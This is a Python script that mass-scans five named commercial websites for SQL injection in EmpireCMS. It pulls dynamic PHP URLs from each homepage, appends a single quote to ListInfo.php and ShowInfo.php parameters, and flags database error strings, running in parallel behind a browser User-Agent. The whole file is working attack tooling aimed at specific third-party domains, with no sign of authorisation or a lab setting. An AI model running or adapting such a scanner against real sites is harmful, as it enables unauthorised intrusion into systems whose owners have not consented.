#!/usr/bin/env python3
"""EmpireCMS front-end SQLi on ListInfo/ShowInfo - quote-diff with real error check"""
import urllib.request, re
from concurrent.futures import ThreadPoolExecutor, as_completed

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SQL_ERRS = [b"SQL", b"mysql", b"syntax", b"Warning", b"Db_Error", b"query"]

def fetch(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read(60000)
    except urllib.error.HTTPError as e:
        return e.code, e.read(3000)
    except Exception:
        return 0, b""

def probe(d):
    scheme = "https://" if d in ("china-qualityinspection.com", "dhyindustry.com", "uy-mold.com", "treasurebeingyou.com") else "http://"
    out = [d]
    code, body = fetch(scheme + d + "/")
    hl = body.decode("utf-8", "ignore")
    # find dynamic urls with empire params
    dyn = set(re.findall(r'([\w./-]+\.php\?(?:classid|id|newsid|bclassid|cid)=[\w]+)', hl))
    out.append("dyn: %s" % list(dyn)[:4])
    for u in list(dyn)[:3]:
        base = scheme + d + "/" + u.lstrip("/")
        c1, b1 = fetch(base)
        c2, b2 = fetch(base + "'")
        if b1 and b2:
            errs = [s for s in SQL_ERRS if s in b2 and s not in b1]
            if errs:
                out.append("SQLI: %s' (%s)" % (u, errs[0].decode()))
    # empire known endpoints
    for p in ["/e/action/ListInfo.php?classid=1", "/e/action/ShowInfo.php?classid=1&id=1",
              "/e/action/ListInfo.php?tempid=1"]:
        c, b = fetch(scheme + d + p)
        if c == 200 and len(b) > 2000:
            c2, b2 = fetch(scheme + d + p + "'")
            errs = [s for s in SQL_ERRS if s in b2 and s not in b]
            if errs:
                out.append("SQLI2: %s (%s)" % (p, errs[0].decode()))
    return out

doms = ["treasurebeingyou.com", "sdgbgg.com", "china-qualityinspection.com", "uy-mold.com", "dhyindustry.com"]
with ThreadPoolExecutor(max_workers=5) as ex:
    futs = {ex.submit(probe, d): d for d in doms}
    for fut in as_completed(futs):
        print(" | ".join(fut.result()), flush=True)
